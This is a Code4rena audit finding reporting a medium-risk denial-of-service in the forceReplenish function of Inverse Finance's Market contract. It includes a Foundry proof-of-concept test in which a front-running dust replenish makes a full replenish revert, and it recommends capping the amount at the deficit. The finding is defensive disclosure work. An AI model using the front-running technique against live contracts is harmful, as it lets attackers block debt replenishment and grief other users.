## Tags

- bug
- 2 (Med Risk)
- satisfactory
- sponsor confirmed
- selected for report
- M-13

# [`Market::forceReplenish` can be DoSed](https://github.com/code-423n4/2022-10-inverse-findings/issues/443) 

# Lines of code

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562


# Vulnerability details

## Impact
If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.

## Proof of Concept
```javascript
    function testForceReplenishFrontRun() public {
        gibWeth(user, wethTestAmount);
        gibDBR(user, wethTestAmount / 14);
        uint initialReplenisherDola = DOLA.balanceOf(replenisher);

        vm.startPrank(user);
        deposit(wethTestAmount);
        uint borrowAmount = getMaxBorrowAmount(wethTestAmount);
        market.borrow(borrowAmount);
        uint initialUserDebt = market.debts(user);
        uint initialMarketDola = DOLA.balanceOf(address(market));
        vm.stopPrank();

        vm.warp(block.timestamp + 5 days);
        uint deficitBefore = dbr.deficitOf(user);
        vm.startPrank(replenisher);

        market.forceReplenish(user,1); // front run DoS

        vm.expectRevert("Amount > deficit");
        market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit
        
        assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");
        assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");
        assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),
            "DOLA balance of market did not decrease by amount paid to replenisher");
        assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");

        // debt only increased by dust
        assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");
    }
```
This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks. 

## Tools Used
vscode, forge

## Recommended Mitigation Steps
Use `min(deficit,amount)` as amount to replenish
